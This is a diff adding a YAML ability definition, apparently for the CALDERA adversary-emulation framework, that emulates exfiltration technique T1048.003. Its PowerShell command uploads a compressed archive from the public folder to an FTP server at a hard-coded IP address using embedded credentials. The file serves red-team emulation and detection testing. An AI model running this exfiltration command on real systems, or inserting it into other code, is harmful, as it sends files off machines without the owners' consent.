@@ -1,0 +1,65 @@
+- additional_info: {}
+  privilege: ''
+  plugin: stockpile
+  technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+  buckets:
+  - exfiltration
+  singleton: false
+  tactic: exfiltration
+  technique_id: T1048.003
+  access: {}
+  delete_payload: true
+  executors:
+  - platform: windows
+    command: '$SourceFile = "data.zip";
+
+      $SourceDirectory = "$env:PUBLIC\";
+
+      $FullPathFile=$SourceDirectory+$SourceFile;
+
+      $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-$SourceFile";
+
+      $ftp = [System.Net.FtpWebRequest]::Create("ftp://192.168.0.102:2222/$RemoteName");
+
+      $ftp = [System.Net.FTPWebRequest]$ftp;
+
+      $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;
+
+      $ftp.Credentials = New-Object System.Net.NetworkCredential("caldera_user", "caldera");
+
+      $ftp.UseBinary = $true;
+
+      $ftp.UsePassive = $true;
+
+
+      $content = gc -encoding Byte $FullPathFile;
+
+      $ftp.ContentLength = $content.Length;
+
+      $requestStream = $ftp.GetRequestStream();
+
+      $requestStream.Write($content, 0, $content.Length);
+
+
+      $requestStream.Close();
+
+      $requestStream.Dispose();'
+    additional_info: {}
+    code: null
+    cleanup: []
+    timeout: 60
+    parsers: []
+    variations: []
+    payloads: []
+    language: null
+    build_target: null
+    uploads: []
+    name: psh
+  requirements:
+  - relationship_match:
+    - source: host.dir.compress
+    module: plugins.stockpile.app.requirements.paw_provenance
+  repeatable: false
+  description: Exfiltrates a compressed archive to an FTP server.
+  name: Exfiltration of a Compressed Archive to FTP Server
+  id: ftp_archive_exfiltration
